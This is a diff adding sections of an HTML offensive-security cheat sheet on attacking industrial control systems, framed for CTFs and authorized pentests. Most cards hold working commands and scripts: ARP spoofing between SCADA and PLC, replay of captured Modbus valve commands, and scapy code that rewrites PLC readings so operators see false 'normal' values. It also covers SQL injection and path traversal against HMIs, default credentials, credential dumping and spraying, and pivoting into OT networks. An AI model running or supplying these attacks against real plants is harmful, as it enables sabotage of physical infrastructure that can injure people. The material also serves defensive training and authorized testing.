+    <!-- ══════════ SECTION 11: MiTM ══════════ -->
+    <section class="section" id="s11">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,71,87,0.1)">🕵️</div>
+        <div>
+          <div class="section-title">MiTM, ARP Spoofing & Replay Attacks</div>
+          <div class="section-sub">Intercept SCADA-to-PLC traffic — read, manipulate, replay</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,71,87,0.1);color:#ff4757;border:1px solid rgba(255,71,87,0.3)">ADVANCED</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🎭 ARP Spoofing — Position Between SCADA & PLC</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">arpspoof — intercept SCADA↔PLC traffic</div>
+              <div class="cmd-code"># Enable IP forwarding (so traffic still flows)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Spoof ARP between SCADA (192.168.1.5) 
+# and PLC (192.168.1.10)
+# Terminal 1: tell PLC "I am the SCADA"
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.5
+
+# Terminal 2: tell SCADA "I am the PLC"
+arpspoof -i eth0 -t 192.168.1.5 192.168.1.10
+
+# Now capture Modbus in real time
+tcpdump -i eth0 -nn port 502 -w mitm.pcap
+
+# Or use ettercap for combined MiTM
+ettercap -T -i eth0 \
+  -M arp /192.168.1.5// /192.168.1.10//</div>
+              <div class="cmd-explain">ARP spoofing tricks both devices into sending traffic through our machine. <b>IP forwarding ON</b> = traffic still reaches the destination (covert). IP forwarding OFF = DoS (both sides lose connectivity). Since Modbus/DNP3 have no encryption, once we're in the middle we can read ALL process data in real time — like having a persistent wiretap on the control channel.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔄 Replay Attack — Replay Old Commands</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">tcpreplay — replay captured Modbus writes</div>
+              <div class="cmd-code"># 1. Capture a legitimate "open valve" command
+tcpdump -i eth0 -nn port 502 -w valve_open.pcap
+
+# 2. Inspect the capture
+tcpdump -r valve_open.pcap -XX | grep -A5 "502"
+
+# 3. Replay — resend the same command later
+# (e.g., reopen a valve that operator closed)
+tcpreplay -i eth0 --pps 1 valve_open.pcap
+
+# More surgical: extract and replay with scapy
+python3 -c "
+from scapy.all import *
+pkts = rdpcap('valve_open.pcap')
+for p in pkts:
+    if p.haslayer('TCP') and p.dport == 502:
+        send(p, verbose=0)
+"</div>
+              <div class="cmd-explain">Since Modbus has no sequence numbers or timestamps for authentication, <b>replaying a captured legitimate command is indistinguishable from the real thing</b>. If you captured a "open valve" Modbus write, you can replay it hours later to reopen a valve the operator just closed. The PLC accepts it as legitimate because there's no way to tell otherwise.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🎭 Modbus Response Spoofing (False Data)</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">scapy — intercept and modify Modbus responses</div>
+              <div class="cmd-code">python3 << 'EOF'
+from scapy.all import *
+
+def modify_modbus(pkt):
+    # Intercept Modbus TCP responses from PLC
+    if pkt.haslayer('TCP') and pkt.sport == 502:
+        raw = bytes(pkt['Raw'])
+        if len(raw) > 9:
+            # Modbus response: bytes 9+ are register values
+            # Replace real values with fake "normal" values
+            # Byte 9-10: first register value
+            # 0x00 0x64 = 100 (looks normal)
+            fake = raw[:9] + b'\x00\x64' + raw[11:]
+            pkt['Raw'].load = fake
+            # Recalculate checksums
+            del pkt['IP'].chksum
+            del pkt['TCP'].chksum
+    return pkt
+
+# Intercept and modify in transit
+sniff(iface='eth0', filter='tcp port 502', 
+      prn=modify_modbus)
+EOF</div>
+              <div class="cmd-explain">This is the <b>most insidious ICS attack</b>: the process is in an unsafe state, but the SCADA shows everything is normal. While actually-dangerous values come from the PLC, we intercept and replace them with "normal" values before they reach the HMI. Operators see green dashboards while the plant is heading toward failure. This is what Stuxnet did to Iranian operators for over a year.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 12: FIRMWARE / HMI ══════════ -->
+    <section class="section" id="s12">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,71,87,0.1)">💾</div>
+        <div>
+          <div class="section-title">Firmware Analysis & HMI Exploitation</div>
+          <div class="section-sub">Extract, analyze, and backdoor embedded ICS firmware</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,71,87,0.1);color:#ff4757;border:1px solid rgba(255,71,87,0.3)">ADVANCED</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔬 Firmware Extraction & Analysis</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">binwalk — extract ICS firmware</div>
+              <div class="cmd-code">sudo apt install binwalk -y
+
+# Analyze firmware file (downloaded from vendor site
+# or extracted via TFTP/FTP from device)
+binwalk firmware.bin
+
+# Extract all file systems
+binwalk -e firmware.bin
+cd _firmware.bin.extracted/
+
+# Look for hardcoded credentials
+grep -r "password\|passwd\|admin\|secret" \
+  --include="*.conf" --include="*.xml" \
+  --include="*.ini" -i .
+
+# Find private keys
+grep -r "BEGIN RSA\|BEGIN EC\|BEGIN PRIV" .
+
+# Strings analysis for URLs, IPs
+strings firmware.bin | grep -E \
+  "([0-9]{1,3}\.){3}[0-9]{1,3}"
+
+# Check for known vuln libraries
+strings firmware.bin | grep -E \
+  "OpenSSL|libssl|libc-|uClibc"</div>
+              <div class="cmd-explain">ICS firmware is often available on vendor websites for "upgrade purposes." <b>binwalk</b> identifies and extracts embedded file systems (squashfs, cramfs, jffs2). Inside you'll find: Linux root filesystem, web server files, config files with <b>hardcoded passwords</b>, private TLS keys, and sometimes the full PLC runtime source. Hardcoded creds found in firmware work on every device using that firmware version.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🖥️ HMI / SCADA Software Attacks</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">common HMI vulnerabilities to test</div>
+              <div class="cmd-code"># 1. SCADA web interface — often runs Apache/IIS
+# Test for SQLi in tag history queries
+curl "http://192.168.1.50/History/GetData?\
+tagName=Pressure' OR '1'='1"
+
+# 2. Path traversal in file-serving SCADA
+curl "http://192.168.1.50/display/\
+../../../Windows/win.ini"
+
+# 3. Look for RDP on HMI (common: operators use it)
+nmap -p 3389 192.168.1.0/24 --max-rate 5
+# Default HMI RDP creds: 
+# Administrator:(blank), SCADA:scada, operator:operator
+
+# 4. VNC on HMI (unencrypted, no auth sometimes)
+nmap -p 5900,5901 192.168.1.0/24 --max-rate 5
+vncviewer 192.168.1.50:5900
+
+# 5. TFTP — get config from devices
+tftp 192.168.1.10
+get startup-config
+get /etc/passwd</div>
+              <div class="cmd-explain">HMIs are essentially Windows PCs that haven't been patched since they were installed (patching HMIs is risky — it can break the SCADA software). They run old IE, outdated Java, unpatched Windows. <b>RDP and VNC</b> are commonly left open for remote operator access with weak/no passwords. Once on the HMI, you can control the entire plant through the SCADA GUI — no protocol knowledge needed.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 13: LATERAL MOVEMENT ══════════ -->
+    <section class="section" id="s13">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,215,0,0.1)">🦀</div>
+        <div>
+          <div class="section-title">Lateral Movement in OT Networks</div>
+          <div class="section-sub">Pivot from IT network down to OT — crossing the air gap</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">MID</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🌉 IT-to-OT Pivot Path</span></div>
+          <div class="card-body">
+            <div class="info-box info-blue"><strong>Typical Attack Path</strong>1. Phish employee → get foothold on IT workstation. 2. Credential dump with Mimikatz → find domain admin. 3. Move to Historian / Jump Server (in DMZ/Level 3). 4. From Historian, access OT network (often no firewall between them). 5. Scan for PLCs and HMIs. 6. Exploit ICS protocols directly.</div>
+            <div class="cmd-block">
+              <div class="cmd-label">check for DMZ / dual-homed systems</div>
+              <div class="cmd-code"># On compromised Windows host — check interfaces
+ipconfig /all
+# Look for TWO network interfaces — common on Historians
+# e.g., 10.0.0.x (IT) AND 192.168.1.x (OT)
+
+# Scan for OT network from dual-homed host
+# Route to OT subnet via compromised host
+route print
+
+# Set up SOCKS proxy for pivot
+# On attack machine:
+ssh -D 1080 user@compromised_host
+# Now configure proxychains to use 127.0.0.1:1080
+
+# Scan OT segment through pivot
+proxychains nmap -sT -p 502,102,44818 \
+  192.168.1.0/24 --max-rate 5</div>
+              <div class="cmd-explain">Historian servers are the <b>classic pivot point</b> — they need to collect data from OT PLCs AND send reports to IT enterprise systems. So they have <b>two NICs</b>: one on each network. Once you compromise the Historian (which often runs Windows with RDP open), you're on the OT segment. SOCKS proxy via SSH lets you tunnel all your ICS tools through the pivot without installing anything on the target.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔑 Credential Reuse in OT</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">impacket — spray creds across OT Windows hosts</div>
+              <div class="cmd-code"># Dump creds from IT foothold
+python3 secretsdump.py \
+  DOMAIN/user:pass@10.0.0.5
+
+# Spray harvested creds on OT hosts
+# (HMIs, Engineering Workstations run Windows)
+for host in 192.168.1.50 192.168.1.51 192.168.1.52; do
+  python3 smbclient.py \
+    Administrator:Password123@$host
+done
+
+# Check for EWS (Engineering Workstations)
+# These have TIA Portal, Studio 5000, etc.
+# If you can RDP here, you can reprogram PLCs via GUI
+crackmapexec smb 192.168.1.0/24 \
+  -u Administrator -p 'Password123' \
+  --shares</div>
+              <div class="cmd-explain">OT environments have terrible password hygiene — the same local admin password is often used on every HMI and EWS because "it's on the OT network, it's safe." <b>Engineering Workstations (EWS)</b> are the holy grail — they have Siemens TIA Portal or Rockwell Studio 5000 installed and can directly program connected PLCs via GUI. No protocol knowledge needed once you're on the EWS.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 14: IMPACT ══════════ -->
+    <section class="section" id="s14">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,71,87,0.1)">💥</div>
+        <div>
+          <div class="section-title">Impact Demonstration (Lab Only)</div>
+          <div class="section-sub">Proving impact without destroying infrastructure — for CTFs and lab scenarios</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,71,87,0.1);color:#ff4757;border:1px solid rgba(255,71,87,0.3)">ADVANCED</span>
+      </div>
+
+      <div class="info-box info-red">
+        <strong>⛔ STRICTLY LAB / AUTHORIZED ENVIRONMENTS ONLY</strong>
+        The techniques in this section, if applied to real systems, can cause physical destruction of equipment, environmental disasters, and loss of human life. These exist here for understanding defense and for authorized CTF/lab use only.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">📋 Impact Proof Techniques for CTFs</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">demonstrate full read access (impact proof)</div>
+              <div class="cmd-code">python3 << 'EOF'
+# CTF impact proof — demonstrate read of all process data
+from pymodbus.client import ModbusTcpClient
+import json, datetime
+
+c = ModbusTcpClient('192.168.1.10')
+c.connect()
+
+report = {
+    'timestamp': str(datetime.datetime.now()),
+    'target': '192.168.1.10',
+    'coils': c.read_coils(0, 64, slave=1).bits[:64],
+    'input_regs': c.read_input_registers(0, 30, slave=1).registers,
+    'holding_regs': c.read_holding_registers(0, 30, slave=1).registers
+}
+
+print(json.dumps(report, indent=2, default=str))
+c.close()
+# This proves: unauthenticated full process read
+# In a real plant = complete operational intelligence
+EOF</div>
+              <div class="cmd-explain">For CTF/pentest reporting: dump the full process state as JSON. This proves you had <b>complete unauthenticated read access</b> to all process variables — sensor readings, actuator states, setpoints. In a real pentest report, this demonstrates that an adversary could learn the complete operational state of the facility without any credentials.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">demonstrate write capability (controlled lab test)</div>
+              <div class="cmd-code">python3 -c "
+from pymodbus.client import ModbusTcpClient
+
+c = ModbusTcpClient('192.168.1.10')
+c.connect()
+
+# Read original value
+orig = c.read_holding_registers(0, 1, slave=1).registers[0]
+print(f'Original value: {orig}')
+
+# Write test value
+c.write_register(0, 12345, slave=1)
+verify = c.read_holding_registers(0, 1, slave=1).registers[0]
+print(f'After write: {verify}')  # Should be 12345
+
+# ALWAYS restore original value after proof!
+c.write_register(0, orig, slave=1)
+print(f'Restored to: {orig}')
+c.close()
+"</div>
+              <div class="cmd-explain">The golden rule of ICS pentesting: <b>READ → PROVE → RESTORE</b>. Before writing, save the original value. Write your test value (pick something non-extreme: not 0, not 65535 — pick a value close to current). Verify write succeeded by reading back. Then <b>immediately restore</b> the original. Never leave modified values. This minimizes risk while proving write access.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">📝 Pentest Report Evidence Collection</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">automated ICS pentest evidence script</div>
+              <div class="cmd-code">python3 << 'EOF'
+import socket, subprocess, json
+from pymodbus.client import ModbusTcpClient
+
+targets = ['192.168.1.10', '192.168.1.20']
+evidence = []
+
+for ip in targets:
+    result = {'ip': ip, 'findings': []}
+    
+    # 1. Port scan evidence
+    for port in [502, 102, 44818, 20000]:
+        try:
+            s = socket.socket()
+            s.settimeout(2)
+            if s.connect_ex((ip, port)) == 0:
+                result['findings'].append(
+                    f'OPEN PORT {port} — {
+                     {502:"Modbus",102:"S7",
+                      44818:"EtherNet/IP",
+                      20000:"DNP3"}[port]}')
+            s.close()
+        except: pass
+    
+    # 2. Modbus unauthenticated access proof
+    try:
+        c = ModbusTcpClient(ip)
+        c.connect()
+        r = c.read_holding_registers(0, 5, slave=1)
+        if r and not r.isError():
+            result['findings'].append(
+                f'UNAUTHENTICATED MODBUS READ: {r.registers}')
+        c.close()
+    except: pass
+    
+    evidence.append(result)
+
+print(json.dumps(evidence, indent=2))
+EOF</div>
+              <div class="cmd-explain">Automated evidence collection for pentest reports. Combines port discovery with protocol-level proof of access. Output is structured JSON — easy to include in reports. The key finding to highlight: <b>unauthenticated protocol access</b>. This maps to MITRE ATT&CK for ICS: T0846 (Remote System Discovery), T0843 (Program Download), T0836 (Modify Parameter).</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 15: TOOLS ══════════ -->
+    <section class="section" id="s15">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(57,255,154,0.1)">🧰</div>
+        <div>
+          <div class="section-title">ICS/OT Tools Glossary</div>
+          <div class="section-sub">Complete toolbox — what each tool does and when to use it</div>
+        </div>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">🔧 Complete Tool Reference</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>TOOL</th><th>PROTOCOL</th><th>PURPOSE</th></tr>
+              <tr><td>nmap + NSE</td><td>All</td><td>Port scan, fingerprinting. Scripts: modbus-discover, s7-info, enip-info, bacnet-info</td></tr>
+              <tr><td>Metasploit</td><td>All</td><td>ICS auxiliary modules for Modbus, S7, EtherNet/IP, DNP3. Also post-exploitation on HMIs.</td></tr>
+              <tr><td>pymodbus</td><td>Modbus</td><td>Python Modbus TCP/RTU client. Read/write coils, registers. Best for scripting.</td></tr>
+              <tr><td>mbtget</td><td>Modbus</td><td>CLI Modbus register reader. Quickest way to dump registers from command line.</td></tr>
+              <tr><td>python-snap7</td><td>S7comm</td><td>Python client for Siemens S7 PLCs. Read/write DBs, inputs, outputs. CPU control.</td></tr>
+              <tr><td>cpppo</td><td>EtherNet/IP</td><td>Python EtherNet/IP / CIP library. Read/write Allen-Bradley tags by name.</td></tr>
+              <tr><td>opcua</td><td>OPC-UA</td><td>Python OPC-UA client. Browse and read OPC server node trees. Anonymous access testing.</td></tr>
+              <tr><td>scapy</td><td>Any</td><td>Raw packet crafting. Build custom Modbus, DNP3, S7 packets. MiTM packet manipulation.</td></tr>
+              <tr><td>Wireshark</td><td>All</td><td>Packet capture + ICS protocol dissectors (Modbus, DNP3, S7, EtherNet/IP built-in).</td></tr>
+              <tr><td>Zeek/Bro</td><td>All</td><td>Passive ICS traffic analysis. Generates structured logs per protocol. Best for passive recon.</td></tr>
+              <tr><td>PLCScan</td><td>Multi</td><td>Dedicated ICS host scanner. Tries multiple protocols simultaneously. Python-based.</td></tr>
+              <tr><td>Redpoint (NSE)</td><td>BACnet, DNP3</td><td>Digital Bond's NSE scripts for nmap. Adds BACnet, HART, DNP3, Crimson3 scanning.</td></tr>
+              <tr><td>ISF (ICS Security Framework)</td><td>Multi</td><td>Metasploit-like framework specifically for ICS. Has more ICS modules. Python.</td></tr>
+              <tr><td>GrassMarlin</td><td>All</td><td>CISA-released passive ICS network mapping tool. Visualizes OT network topology.</td></tr>
+              <tr><td>binwalk</td><td>—</td><td>Firmware analysis and extraction. Find embedded files, hardcoded creds, keys.</td></tr>
+              <tr><td>arpspoof / ettercap</td><td>—</td><td>ARP spoofing for MiTM between SCADA and PLC. Position for traffic interception.</td></tr>
+              <tr><td>tcpreplay</td><td>—</td><td>Replay captured PCAPs. Replay legitimate command captures to re-trigger actions.</td></tr>
+              <tr><td>Shodan CLI</td><td>—</td><td>Search internet-exposed ICS devices. Essential for external recon phase.</td></tr>
+              <tr><td>CrackMapExec</td><td>SMB/RDP</td><td>Spray credentials across Windows HMIs and EWS. Find reused passwords.</td></tr>
+              <tr><td>impacket</td><td>SMB/DCOM</td><td>SMB/RPC exploitation on Windows HMIs. secretsdump for credential harvesting.</td></tr>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 16: CHECKLIST ══════════ -->
+    <section class="section" id="s16">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(57,255,154,0.1)">✅</div>
+        <div>
+          <div class="section-title">ICS Lab Engagement Checklist</div>
+          <div class="section-sub">Systematic approach — don't miss anything in CTF/lab scenarios</div>
+        </div>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Phase 1 — Passive Recon</span></div>
+          <div class="card-body">
+            <div class="info-box info-green">
+              <strong>□ Capture traffic passively (tcpdump/Zeek)</strong>
+              Before touching anything, listen. See what protocols are naturally flowing. Note source/dest IPs, protocol types, polling intervals.
+            </div>
+            <div class="info-box info-green">
+              <strong>□ Identify active ICS protocols from captures</strong>
+              Filter: port 502 (Modbus), 102 (S7), 44818 (EtherNet/IP), 20000 (DNP3), 47808 (BACnet)
+            </div>
+            <div class="info-box info-green">
+              <strong>□ Map SCADA↔PLC communication pairs</strong>
+              Which IP is the master (SCADA) vs outstation (PLC/RTU)?
+            </div>
+            <div class="info-box info-green">
+              <strong>□ Shodan for external exposure</strong>
+              Is anything internet-facing? Check Shodan for target IP range / organization.
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Phase 2 — Active Discovery</span></div>
+          <div class="card-body">
+            <div class="info-box info-blue">
+              <strong>□ Slow nmap scan (--max-rate 10) for ICS ports only</strong>
+              Ports: 102, 502, 2222, 4840, 20000, 44818, 47808, 2404, 5450
+            </div>
+            <div class="info-box info-blue">
+              <strong>□ Run ICS NSE scripts on discovered hosts</strong>
+              modbus-discover, s7-info, enip-info, bacnet-info
+            </div>
+            <div class="info-box info-blue">
+              <strong>□ Check for web interfaces (80, 443, 8080, 8443)</strong>
+              Try default credentials on any web UI found
+            </div>
+            <div class="info-box info-blue">
+              <strong>□ Check RDP (3389) and VNC (5900) on Windows hosts</strong>
+              HMIs often have these open with weak/no credentials
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Phase 3 — Enumeration</span></div>
+          <div class="card-body">
+            <div class="info-box info-orange">
+              <strong>□ Read all Modbus data areas (coils, registers)</strong>
+              FC 1-4 read, FC 43 device ID. Note values — understand the process.
+            </div>
+            <div class="info-box info-orange">
+              <strong>□ S7: get_cpu_info(), enumerate DBs 1-100</strong>
+              Note CPU state, firmware version, project name (ASName)
+            </div>
+            <div class="info-box info-orange">
+              <strong>□ EtherNet/IP: browse CIP tag list</strong>
+              Get tag names — required for read/write operations
+            </div>
+            <div class="info-box info-orange">
+              <strong>□ OPC-UA: try anonymous connection, browse nodes</strong>
+              Map the full tag hierarchy
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Phase 4 — Exploitation</span></div>
+          <div class="card-body">
+            <div class="info-box info-red">
+              <strong>□ Attempt unauthenticated write (Modbus/S7/EIP)</strong>
+              Read original → write test value → verify → RESTORE immediately
+            </div>
+            <div class="info-box info-red">
+              <strong>□ Attempt PLC CPU control (S7 stop/start)</strong>
+              Only if lab authorizes this. Document CPU state before/after.
+            </div>
+            <div class="info-box info-red">
+              <strong>□ MiTM positioning (if ARP spoofing in scope)</strong>
+              Position between SCADA and PLC. Capture command stream.
+            </div>
+            <div class="info-box info-red">
+              <strong>□ Credential attacks on Windows HMI/EWS</strong>
+              Default creds, spray harvested creds, check for unpatched vulns
+            </div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">🎓 MITRE ATT&CK for ICS — Technique Quick Reference</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>TECHNIQUE ID</th><th>NAME</th><th>HOW YOU DO IT</th></tr>
+              <tr><td>T0846</td><td>Remote System Discovery</td><td>nmap, PLCScan, Shodan — find ICS hosts</td></tr>
+              <tr><td>T0888</td><td>Remote System Information Discovery</td><td>FC43 device ID, s7-info, enip-info</td></tr>
+              <tr><td>T0843</td><td>Program Download</td><td>S7 program upload via snap7 / MSF</td></tr>
+              <tr><td>T0836</td><td>Modify Parameter</td><td>Write Modbus holding registers, S7 DB write</td></tr>
+              <tr><td>T0855</td><td>Unauthorized Command Message</td><td>Write Modbus coils, CIP tag write, DNP3 operate</td></tr>
+              <tr><td>T0830</td><td>Man in the Middle</td><td>ARP spoof + traffic intercept between SCADA/PLC</td></tr>
+              <tr><td>T0814</td><td>Denial of Control</td><td>Modbus TCP connection flood, S7 CPU stop</td></tr>
+              <tr><td>T0832</td><td>Manipulation of View</td><td>Intercept + modify Modbus responses to HMI</td></tr>
+              <tr><td>T0800</td><td>Activate Firmware Update Mode</td><td>Trigger firmware mode via web UI or protocol</td></tr>
+              <tr><td>T0859</td><td>Valid Accounts</td><td>Default/harvested creds on HMI, EWS, OPC server</td></tr>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+// Navigation
+function scrollTo(id) {
+  document.getElementById(id).scrollIntoView({behavior:'smooth'});
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  event.currentTarget.classList.add('active');
+}
+
+// Copy buttons
+document.querySelectorAll('.cmd-code').forEach(block => {
+  const label = block.previousElementSibling;
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'copy';
+  btn.onclick = () => {
+    navigator.clipboard.writeText(block.textContent.trim());
+    btn.textContent = 'copied!';
+    btn.style.color = 'var(--accent3)';
+    setTimeout(() => { btn.textContent = 'copy'; btn.style.color = ''; }, 1500);
+  };
+  label.appendChild(btn);
+});
+
+// Search
+const searchBox = document.getElementById('searchBox');
+searchBox.addEventListener('input', () => {
+  const q = searchBox.value.toLowerCase().trim();
+  document.querySelectorAll('.card').forEach(card => {
+    const text = card.textContent.toLowerCase();
+    card.classList.toggle('search-hidden', q.length > 1 && !text.includes(q));
+  });
+  document.querySelectorAll('.section').forEach(sec => {
+    const cards = sec.querySelectorAll('.card');
+    const anyVisible = [...cards].some(c => !c.classList.contains('search-hidden'));
+    sec.style.display = (q.length > 1 && !anyVisible) ? 'none' : '';
+  });
+});
+
+// Scroll spy
+const sections = document.querySelectorAll('.section');
+const navItems = document.querySelectorAll('.nav-item');
+const main = document.getElementById('mainContent');
+main.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => {
+    if (s.offsetTop - main.scrollTop < 150) current = s.id;
+  });
+  navItems.forEach(n => {
+    const onclick = n.getAttribute('onclick') || '';
+    const match = onclick.match(/'(s\d+)'/);
+    if (match) n.classList.toggle('active', match[1] === current);
+  });
+});
+</script>
+</body>
+</html>
